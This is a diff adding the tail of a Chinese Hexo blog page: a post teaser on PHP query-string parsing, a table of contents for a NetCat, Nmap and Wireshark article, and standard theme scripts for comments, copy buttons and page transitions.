+                <p class='content'>本篇博客主要介绍了PHP的字符串解析特性相关内容！
+
+
+PHP的字符串解析特性 PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+
+删除空白符 
+将某些字符转换为下...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NetCat"><span class="toc-text">NetCat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-text">常用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="toc-text">远程控制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%90%91"><span class="toc-text">正向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%90%91"><span class="toc-text">反向</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6"><span class="toc-text">传输文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-text">Nmap 参数详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E7%8A%B6%E6%80%81"><span class="toc-text">端口状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF"><span class="toc-text">扫描技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WireShark"><span class="toc-text">WireShark</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
